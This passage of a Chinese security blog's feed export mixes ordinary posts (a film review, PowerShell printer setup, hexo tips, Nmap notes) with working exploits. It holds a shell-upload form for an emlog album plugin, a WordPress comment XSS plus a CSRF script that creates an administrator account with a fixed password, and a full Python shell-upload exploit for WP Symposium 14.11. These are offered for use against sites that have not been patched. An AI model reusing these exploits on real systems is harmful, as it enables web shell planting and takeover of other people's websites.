<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;form id=<span class="string">"exp"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">&lt;p&gt;target url &gt; &lt;input id=<span class="string">"url"</span> type=<span class="string">"text"</span> style=<span class="string">"width: 300px"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;p&gt;shell file &gt; &lt;input type=<span class="string">"file"</span> name=<span class="string">"Filedata"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;input name=<span class="string">"album"</span> type=<span class="string">"hidden"</span> value=<span class="string">"111111"</span> &gt;</div><div class="line">&lt;p&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"GO!"</span> onclick=<span class="string">"exp.action=url.value+'/content/plugins/kl_album/kl_album_ajax_do.php';"</span>&gt;&lt;/p&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>

<p>我们看截图，已经爆出来了<br><img src="http://dn-wwweshell.qbox.me/emlogxx.png" alt="emlog相册插件漏洞"></p>
<p>没有升级插件的小伙伴们赶紧升级一下吧。</p>
]]></content>
    <summary type="html">
    <![CDATA[本文将来和大家共同探讨关于EMLOG相册插件SQL注入漏洞的利用方法及教程]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WordPress评论处XSS&CSRF]]></title>
    <link href="http://www.weshell.net/wordpress-xss-one.html"/>
    <id>http://www.weshell.net/wordpress-xss-one.html</id>
    <published>2015-01-07T13:17:16.000Z</published>
    <updated>2015-01-07T12:35:02.000Z</updated>
    <content type="html"><![CDATA[<p> 现在这个漏洞依然存在，我们来构造CSRF脚本，让管理员执行我们要执行的动作</p>
<p>首先我们打开前台评论输入：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span></div></pre></td></tr></table></figure>

<p>点击提交之后，弹窗cookie<br><img src="http://dn-wwweshell.qbox.me/wordpress-xss-11.png" alt="wordpress-xss"></p>
<p>当然这个XSS脚本提交之后是不会在后台执行的，但是始终存在，我们可以构造一个CSRF脚本来getshell，脚本具体怎么写，因人而异，下面是列子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">pre</span> <span class="attribute">class</span>=<span class="value">"lang:xhtml decode:true "</span> &gt;</span>var request = false;</div><div class="line">if(window.XMLHttpRequest) {</div><div class="line">request = new XMLHttpRequest();</div><div class="line">if(request.overrideMimeType) {</div><div class="line">request.overrideMimeType('text/xml');</div><div class="line">}</div><div class="line">} else if(window.ActiveXObject) {</div><div class="line">var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];</div><div class="line">for(var i=0; i<span class="tag">&lt;<span class="title">versions.length;</span> <span class="attribute">i</span>++) {</span></div><div class="line"><span class="attribute">try</span> {</div><div class="line"><span class="attribute">request</span> = <span class="attribute">new</span> <span class="attribute">ActiveXObject</span>(<span class="attribute">versions</span>[<span class="attribute">i</span>]);</div><div class="line">} <span class="attribute">catch</span>(<span class="attribute">e</span>) {}</div><div class="line">}</div><div class="line">}</div><div class="line"><span class="attribute">var</span> <span class="attribute">src</span>=<span class="value">location.href.substring(0,location.href.lastIndexOf('</span>/'));</div><div class="line"><span class="attribute">xmlhttp</span>=<span class="value">request;</span></div><div class="line"><span class="attribute">POSTa</span>();</div><div class="line"><span class="attribute">function</span> <span class="attribute">POSTa</span>(){</div><div class="line"><span class="attribute">xmlhttp.open</span>("<span class="attribute">GET</span>", <span class="attribute">src</span>+"/<span class="attribute">wp-admin</span>/<span class="attribute">user-new.php</span>", <span class="attribute">false</span>);</div><div class="line"><span class="attribute">xmlhttp.send</span>(<span class="attribute">postStr</span>);</div><div class="line"><span class="attribute">var</span> <span class="attribute">respone</span> = <span class="attribute">xmlhttp.responseText</span>; </div><div class="line"><span class="attribute">var</span> <span class="attribute">arr</span>=<span class="value">respone.match(</span>/<span class="attribute">name</span>\<span class="attribute">s</span>*=<span class="value">\s*"_wpnonce_create-user"\s*value\s*=\s*"(.*?)"</span>/);</div><div class="line"><span class="attribute">var</span> <span class="attribute">hash</span>=<span class="value">arr[1];</span> </div><div class="line"><span class="attribute">var</span> <span class="attribute">postStr</span>=<span class="value">("action=createuser&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=admin&email=admin%40admin.com&first_name=&last_name=&url=&pass1=adminadmin%21%40%23%24&pass2=adminadmin%21%40%23%24&role=administrator&createuser=%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7&_wpnonce_create-user="+hash);</span></div><div class="line"><span class="attribute">xmlhttp.open</span>("<span class="attribute">POST</span>", <span class="attribute">src</span>+"/<span class="attribute">wp-admin</span>/<span class="attribute">user-new.php</span>", <span class="attribute">true</span>);</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Content-type</span>", "<span class="attribute">application</span>/<span class="attribute">x-www-form-urlencoded</span>");</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Referer</span>", <span class="attribute">src</span>+"/<span class="attribute">wp-admin</span>/<span class="attribute">user-new.php</span>");</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Content-length</span>", <span class="attribute">postStr.length</span>);</div><div class="line"><span class="attribute">xmlhttp.setRequestHeader</span>("<span class="attribute">Connection</span>", "<span class="attribute">close</span>");</div><div class="line"><span class="attribute">xmlhttp.send</span>(<span class="attribute">postStr</span>);</div><div class="line">}</div></pre></td></tr></table></figure>

<p>当被管理员触发后将会执行以下动作：<br><img src="http://dn-wwweshell.qbox.me/success.png(986×209).png" alt="csrf"></p>
]]></content>
    <summary type="html">
    <![CDATA[最近WordPress小于3.92版本爆出XSS漏洞，攻击者可以利用此漏洞盗取管理员cookie，上传恶意文件，本来进行详细探讨]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[HTML5游戏变身Android恶意软件]]></title>
    <link href="http://www.weshell.net/html5-android.html"/>
    <id>http://www.weshell.net/html5-android.html</id>
    <published>2015-01-07T13:17:16.000Z</published>
    <updated>2015-01-07T11:53:14.000Z</updated>
    <content type="html"><![CDATA[<h2 id="HTML5Android恶意软件击方式">HTML5Android恶意软件击方式</h2>
<p>方法一.初始化本地网络视图<br>这是一种非常受黑客欢迎的攻击方式，使用它并不用改变HTML5应用的代码。黑客只需要初始化一个本地网络视图，加载本地或远程的HTML5/JavaScript/CSS代码即可。这样主程序仍能运行，而产生的却是新的安卓应用。<br>然而，大多数黑客并不会在这里止步，因为只把web应用转为安卓应用是完全没有意义的。黑客在大多数时候会在发布应用之前，就将恶意代码注入其中。<br><img src="http://dn-wwweshell.qbox.me/14205949756209.png" alt="html5"></p>
<p>方法二.将HTML5应用打包通过中间键注入JS恶意代码<br>随着安卓越来越受大众的欢迎，许多中间件由此诞生，方便人们开发跨平台的应用。中间件是一种第三方软件/框架，在应用和操作系统之间作桥梁之用。<br>对于HTML5与相关web应用，现今有几种开源框架支持跨平台开发，比如：Phonegap, Apache Cordova, Crosswalk, Cocoonjs等等，而且这些中间件通常都支持HTML5，其中一个典型例子就是Apache Cordova。<br>除了使用网络视图的HTML5/JavaScript/CSS代码外，适用于那些中间件的应用通常都基于那些框架核心库运行，就如那些定制的浏览器一样。由于那些中间件强大的API给开发者提供了许多便捷，他们只需要使用JS代码就能与安卓进行交互。换句话说，如果HTML5应用利用了中间件的特性，可以轻松进行恶意代码注入和执行。<br><img src="http://dn-wwweshell.qbox.me/14205949462520.png" alt="html5恶意代码"></p>
<h2 id="科普">科普</h2>
<p>WebView(网络视图)：能加载显示网页，可以将其视为一个浏览器，它使用了WebKit渲染引擎加载显示网页。<br>SDK（Software Development Kit）：一般都是一些被软件工程师用于为特定的软件包、软件框架、硬件平台、操作系统等建立应用软件的开发工具的集合。<br>HTML5使得开发更强大的web应用变得更加简单，因其开发的web应用的平台低依赖性，一定程度上在安卓平台上有着较大优势。对于开发者来说，跨平台开发的难度降低，可以说是一次开发多方通用（WORA）并不会在跨平台上耗费精力。对于用户来说，他们可以在不同的移动平台分享喜爱的应用。这些意味着使用HTML5进行web应用开发，对于诸方都是有利的。<br>当然，跨平台也会带来隐患比如跨平台注入，JS代码保护的机制太少，导致web应用可以被轻松复制和重新打包。理论上来讲，通过代码注入和重新打包，黑客可以剽窃任何他们想要的HTML5的跨平台web应用。</p>
<h2 id="结尾">结尾</h2>
<p>在未来，我们可以预见到这种由HTML5开发的恶意软件可以通杀不同的移动平台（比如IOS，安卓，WinPhone）。为了避免这种情况，开发者应多花点精力在代码混淆和使用其他编码技巧，这样在一定程度上可以保护他们的应用程序。家庭用户需要使用新的应用程序时，最好去官方应用商店下载。</p>
]]></content>
    <summary type="html">
    <![CDATA[这是一种非常受黑客欢迎的攻击方式，使用它并不用改变HTML5应用的代码。黑客只需要初始化一个本地网络视图，加载本地或远程的HTML5/JavaScript/CSS代码即可。这样主程序仍能运行，而产生的却是新的安卓应用。]]>
    
    </summary>
    
      <category term="网络安全" scheme="http://www.weshell.net/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[《魁拔》不愧为国产巨作]]></title>
    <link href="http://www.weshell.net/kuiba.html"/>
    <id>http://www.weshell.net/kuiba.html</id>
    <published>2015-01-05T14:17:16.000Z</published>
    <updated>2015-01-05T14:54:04.000Z</updated>
    <content type="html"><![CDATA[<h2 id="魁拔语句">魁拔语句</h2>
<p>我的小鱼你醒了，<br>还认识早晨吗？<br>昨夜你曾经说，<br>愿夜幕永不开启。<br>你的香腮边轻轻滑落的，<br>是你的泪，还是我的泪？<br>初吻吻别的那个季节，<br>不是已经哭过了吗？<br>我的指尖还记忆着，<br>你慌乱的心跳。<br>温柔的体香里，<br>那一缕长发飘飘。</p>
<h2 id="正文">正文</h2>
<p>  今天在老家的贴吧里无意间看到了关于魁拔的讨论，无一差评，倍感自豪，because魁拔里的一个角色原型是我嫂子制作的，作为她弟弟的我<br>也提供了不少意见。而且【我的指尖还记忆着，你慌乱的心跳，温柔的体香里，那一缕长发飘飘】这句是由我女朋友提交到魁拔制作组的，可以<br>说魁拔与我有各种千丝万缕的关系，看到它能赢得众多好评心里也是极舒坦的，作为一部动画片能收到这么高的票房，是制作组没有想到的<br>，也是众多动漫爱好者始料未及的，其中七分之六的票房是由成人贡献的，18岁一下的不到七分之一。成人我们都知道，心理、生理都已成熟<br>自然对动画片不屑一顾，它的精彩可见一斑。可以说魁拔所到达的高度是国产动画片前所未有的。</p>
<h2 id="结尾语">结尾语</h2>
<p>  这里强烈推荐大家看一看，这部片子使用的是全新的风格，侠义、江湖、儿女柔情贯穿主体，实在是不可多得好片，就连《秦时明月》也不得低<br>一头，反正Angel在看这部片子的时候心里五味杂陈，有感动，有心酸，有热血……不再多说，其中滋味自行体会。。</p>
]]></content>
    <summary type="html">
    <![CDATA[魁拔观后感]]>
    
    </summary>
    
      <category term="生活琐事" scheme="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用PowerShell安装网络打印机]]></title>
    <link href="http://www.weshell.net/PowerShell-Install.html"/>
    <id>http://www.weshell.net/PowerShell-Install.html</id>
    <published>2015-01-05T13:17:16.000Z</published>
    <updated>2015-01-05T12:58:20.000Z</updated>
    <content type="html"><![CDATA[<p>如何使用Windows PowerShell安装网络打印机？<br>安装新的网络打印机需要使用Windows PowerShell执行以下步骤:<br>1.安装打印机驱动程序<br>2.创建一个标准的TCP/IP端口的打印机<br>3.安装打印机使用指定的端口<br>4.执行任何额外的配置所需的打印机</p>
<p>例如,假设你想要安装戴尔的彩色激光PCL6类驱动打印服务器。 你可以安装Add-PrinterDriver mdlet驱动程序:</p>
<p>PS C:> Add-PrinterDriver -ComputerName HOST7 -Name “Dell Color Laser PCL6 Class Driver”</p>
<p>接下来添加打印机端口:<br>PS C:> Add-PrinterPort -ComputerName HOST7 -Name “172.16.11.63”<br>-PrinterHostAddress“172.16.11.63”</p>
<p>接下来,给add-Printer cmdlet建立一个名称，把他应用到指定端口:<br>PS C:> Add-Printer -ComputerName HOST7 -Name “Sales Printer” <code>-DriverName &quot;Dell Color Laser PCL6 Class Driver&quot; -Shared</code><br>-ShareName “SalesPrint” -PortName “172.16.11.63”</p>
<p>最后你可以更改纸张大小<br>PS C:> Set-PrintConfiguration -ComputerName HOST7 -PrinterName “Sales Printer”</p>
<p>找的国外的一篇教程随便翻译一下，以备自用。</p>
]]></content>
    <summary type="html">
    <![CDATA[假设你想要安装打印机使用戴尔的彩色激光PCL6类驱动打印服务器。 你可以开始使用Add-PrinterDriver cmdlet安装服务器上的打印机驱动程序]]>
    
    </summary>
    
      <category term="生活琐事" scheme="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[WordPress WP Symposium14.11插件上传漏洞]]></title>
    <link href="http://www.weshell.net/wordpress-symposium.html"/>
    <id>http://www.weshell.net/wordpress-symposium.html</id>
    <published>2015-01-05T13:17:16.000Z</published>
    <updated>2015-01-05T13:40:34.000Z</updated>
    <content type="html"><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：WordPress-Symposium14.11插件上传漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：14.11</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h2 id="漏洞产生原因">漏洞产生原因</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">"/wp-symposium/server/file_upload_form.php " </div><div class="line"></div><div class="line">if ($_FILES["file"]["error"] &gt; 0) {</div><div class="line">       echo "Error: " . $_FILES["file"]["error"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">   } else {</div><div class="line">       $allowedExts = ','.get_option(WPS_OPTIONS_PREFIX.'_image_ext').','.get_option(WPS_OPTIONS_PREFIX.'_doc_ext').','.get_option(WPS_OPTIONS_PREFIX.'_video_ext');</div><div class="line">       //echo "Upload: " . $_FILES["file"]["name"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       $ext = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);</div><div class="line">       //echo "Extension: " . $ext . "<span class="tag">&lt;<span class="title">br</span> /&gt;</span>";</div><div class="line">       if (strpos($allowedExts, $ext)) {</div><div class="line">       $extAllowed = true;</div><div class="line">       } else {</div><div class="line">           $extAllowed = false;</div><div class="line">       }</div><div class="line">       //echo "Type: " . $_FILES["file"]["type"] . "<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       //echo "Size: " . ($_FILES["file"]["size"] / 1024) . " kB<span class="tag">&lt;<span class="title">br</span>&gt;</span>";</div><div class="line">       //echo "Stored in: " . $_FILES["file"]["tmp_name"];</div><div class="line"></div><div class="line">       if (!$extAllowed) {</div><div class="line">           echo __('Sorry, file type not allowed.', WPS_TEXT_DOMAIN);</div><div class="line">       } else {</div><div class="line">           // Copy file to tmp location</div></pre></td></tr></table></figure>

<p><br></p>
<h2 id="利用代码python">利用代码python</h2>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line"># Check url</div><div class="line">def checkurl(url):</div><div class="line">    if url[:8] != "https://" and url[:7] != "http://":</div><div class="line">        print('[X] You must insert http:// or https:// procotol')</div><div class="line">        sys.exit(1)</div><div class="line">    else:</div><div class="line">        return url</div><div class="line"></div><div class="line"># Check if file exists and has readable</div><div class="line">def checkfile(file):</div><div class="line">    if not os.path.isfile(file) and not os.access(file, os.R_OK):</div><div class="line">        print '[X] '+file+' file is missing or not readable'</div><div class="line">        sys.exit(1)</div><div class="line">    else:</div><div class="line">        return file</div><div class="line"># Get file's mimetype</div><div class="line">def get_content_type(filename):</div><div class="line">    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'</div><div class="line"></div><div class="line">def id_generator(size=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):</div><div class="line">    return ''.join(random.choice(chars) for _ in range(size))</div><div class="line"></div><div class="line"># Create multipart header</div><div class="line">def create_body_sh3ll_upl04d(payloadname, randDirName, randShellName):</div><div class="line"></div><div class="line">   getfields = dict()</div><div class="line">   getfields['uploader_uid'] = '1'</div><div class="line">   getfields['uploader_dir'] = './'+randDirName</div><div class="line">   getfields['uploader_url'] = url_symposium_upload</div><div class="line"></div><div class="line">   payloadcontent = open(payloadname).read()</div><div class="line"></div><div class="line">   LIMIT = '----------lImIt_of_THE_fIle_eW_$'</div><div class="line">   CRLF = '\r\n'</div><div class="line"></div><div class="line">   L = []</div><div class="line">   for (key, value) in getfields.items():</div><div class="line">      L.append('--' + LIMIT)</div><div class="line">      L.append('Content-Disposition: form-data; name="%s"' % key)</div><div class="line">      L.append('')</div><div class="line">      L.append(value)</div><div class="line"></div><div class="line">   L.append('--' + LIMIT)</div><div class="line">   L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', randShellName+".php"))</div><div class="line">   L.append('Content-Type: %s' % get_content_type(payloadname))</div><div class="line">   L.append('')</div><div class="line">   L.append(payloadcontent)</div><div class="line">   L.append('--' + LIMIT + '--')</div><div class="line">   L.append('')</div><div class="line">   body = CRLF.join(L)</div><div class="line">   return body</div><div class="line"></div><div class="line">commandList = optparse.OptionParser('usage: %prog -t URL -f FILENAME.PHP [--timeout sec]')</div><div class="line">commandList.add_option('-t', '--target', action="store",</div><div class="line">                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",</div><div class="line">                  )</div><div class="line">commandList.add_option('-f', '--file', action="store",</div><div class="line">                  help="Insert file name, ex: shell.php",</div><div class="line">                  )</div><div class="line">commandList.add_option('--timeout', action="store", default=10, type="int",</div><div class="line">                  help="[Timeout Value] - Default 10",</div><div class="line">                  )</div><div class="line"></div><div class="line">options, remainder = commandList.parse_args()</div><div class="line"></div><div class="line"># Check args</div><div class="line">if not options.target or not options.file:</div><div class="line">    print(banner)</div><div class="line">    commandList.print_help()</div><div class="line">    sys.exit(1)</div><div class="line"></div><div class="line">payloadname = checkfile(options.file)</div><div class="line">host = checkurl(options.target)</div><div class="line">timeout = options.timeout</div><div class="line"></div><div class="line">print(banner)</div><div class="line"></div><div class="line">socket.setdefaulttimeout(timeout)</div><div class="line"></div><div class="line">url_symposium_upload = host+'/wp-content/plugins/wp-symposium/server/php/'</div><div class="line"></div><div class="line">content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'</div><div class="line"></div><div class="line">randDirName = id_generator()</div><div class="line">randShellName = id_generator()</div><div class="line"></div><div class="line">bodyupload = create_body_sh3ll_upl04d(payloadname, randDirName, randShellName)</div><div class="line"></div><div class="line">headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',</div><div class="line">           'content-type': content_type,</div><div class="line">           'content-length': str(len(bodyupload)) }</div><div class="line"></div><div class="line">try:</div><div class="line">    req = urllib2.Request(url_symposium_upload+'index.php', bodyupload, headers)</div><div class="line">    response = urllib2.urlopen(req)</div><div class="line">    read = response.read()</div><div class="line"></div><div class="line">    if "error" in read or read == "0" or read == "":</div><div class="line">       print("[X] Upload Failed :(")</div><div class="line">    else:</div><div class="line">       print("[!] Shell Uploaded")</div><div class="line">       print("[!] Location: "+url_symposium_upload+randDirName+randShellName+".php\n")</div><div class="line"></div><div class="line">except urllib2.HTTPError as e:</div><div class="line">    print("[X] "+str(e))</div><div class="line">except urllib2.URLError as e:</div><div class="line">    print("[X] Connection Error: "+str(e))</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[WordPress WP Symposium14.11插件上传漏洞以及漏洞利用方法]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Nmap 6.40发布!全新架构,更好的性能!]]></title>
    <link href="http://www.weshell.net/npm6.4.0.html"/>
    <id>http://www.weshell.net/npm6.4.0.html</id>
    <published>2015-01-05T13:17:16.000Z</published>
    <updated>2015-01-05T13:25:56.000Z</updated>
    <content type="html"><![CDATA[<h2 id="支持">支持</h2>
<p>Nmap 6.40支持Linux,Windows和Mac<br>下载地址：”<a href="http://nmap.org/download.html" target="_blank" rel="external">http://nmap.org/download.html</a>“ 如果你发现有bug可以再这里给我们回馈”<a href="http://nmap.org/book/man-bugs.html" target="_blank" rel="external">http://nmap.org/book/man-bugs.html</a>“</p>
<h2 id="特性">特性</h2>
<p>o(Ncat)- i选项(闲置超时)现在以监听模式以及工作<br>连接模式。</p>
<p>o(Ncat)——ssl-cert Ncat现在支持链证书<br>选择。</p>
<p>o(Ncat)修复固定连接到IPv6代理中的错误</p>
<p>o(Ncat)重写telnet-brute以便获得更好的兼容性</p>
<p>o(Ncat)优化解析输出XML时间</p>
]]></content>
    <summary type="html">
    <![CDATA[Nmap 6.40全新发布，以及更新文档、使用帮助文档]]>
    
    </summary>
    
      <category term="神兵利器" scheme="http://www.weshell.net/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[hexo优化之添加关键字]]></title>
    <link href="http://www.weshell.net/hexo-keywords.html"/>
    <id>http://www.weshell.net/hexo-keywords.html</id>
    <published>2015-01-04T13:17:16.000Z</published>
    <updated>2015-01-04T12:15:10.000Z</updated>
    <content type="html"><![CDATA[<h2 id="啰嗦几句">啰嗦几句</h2>
<p>  不得不赞美hexo的强大，你甚至能把它全部代码都部署在七牛和又拍云以及类似的平台，唉！没有早点遇上它，可惜了。。<br>能看到这篇文章的基本都是懒人，像我一样。我是因为自己没有找到相关的教程，才硬着头皮去看了两下官方文档，好家伙，<br>全英文，于是CTRL+F搜索keywords，折腾半天，又是翻译又是测试的，要怪就怪我英语是语文老师教的。各位大牛勿见笑，毕竟<br>我是新人。我相信用hexo的都是逼格极高的程序员… …你们不会笑的</p>
<h2 id="添加关键词">添加关键词</h2>
<p>  作为强迫症，我必须要求我的博客和别人的博客一模一样，标题、描述、关键词、作者一个都不能少，但是尼玛hexo非要跟我过不<br>去，什么都有了，就是keywords没有（这么说也不对，毕竟是隐藏属性）。官方文档上说description和keywords这俩玩意儿自带的<br>有，不用再去XXX，直接调用就OK了，果断测试了一下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">title: 安全天使angel的测试</div><div class="line">description: 这是描述</div><div class="line">keywords: 这是关键字</div><div class="line">------------------------</div><div class="line">返回结果：</div><div class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>安全天使angel的测试<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"description"</span> <span class="attribute">content</span>=<span class="value">"这是描述"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"未指定"</span>&gt;</span></div><div class="line"></div><div class="line">我XX，显示尼玛未指定，定睛一看麻蛋，忘记调用了</div><div class="line">打开themes/主题/layout/_partial/head.ejs 找到输出keywords的语句，替换为：</div><div class="line">  <span class="vbscript">&lt;% <span class="keyword">if</span> (page.keywords){ %&gt;</span>  //如果是文章页则输出文章页指定的关键词</div><div class="line">  <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"&lt;%= page.keywords %&gt;"</span>&gt;</span></div><div class="line"><span class="vbscript">&lt;% } <span class="keyword">else</span> <span class="keyword">if</span> (config.keywords){ %&gt;</span>//如果是首页是使用配置文件中的keywords</div><div class="line">  <span class="tag">&lt;<span class="title">meta</span> <span class="attribute">name</span>=<span class="value">"keywords"</span> <span class="attribute">content</span>=<span class="value">"&lt;%= config.keywords %&gt;"</span>&gt;</span></div><div class="line"><span class="vbscript">&lt;% } %&gt;</span></div></pre></td></tr></table></figure>

<p>最后别忘了在hexo的_config.yml配置文件中添加keywords（不是主题的_config.yml文件），这里的keywords是显示首页的关键字<br>最后用GIT部署，如果没有效果则键入以下命令：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">rm -rf <span class="keyword">public</span></div><div class="line">hexo clean</div><div class="line">rm -rf .deploy</div><div class="line">hexo g</div><div class="line">hexo d</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[hexo怎么添加关键字？今天俺来教大家来添加，另附上其他hexo优化技巧]]>
    
    </summary>
    
      <category term="生活琐事" scheme="http://www.weshell.net/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Nmap使用手册]]></title>
    <link href="http://www.weshell.net/namp-help.html"/>
    <id>http://www.weshell.net/namp-help.html</id>
    <published>2015-01-04T13:17:16.000Z</published>
    <updated>2015-01-09T06:44:42.000Z</updated>
    <content type="html"><![CDATA[<h2 id="简单示例">简单示例</h2>
<p>使用ping检测10.0.0.0/24这个网段</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sP 10.0.0.0/24</div></pre></td></tr></table></figure>

<p>`</p>
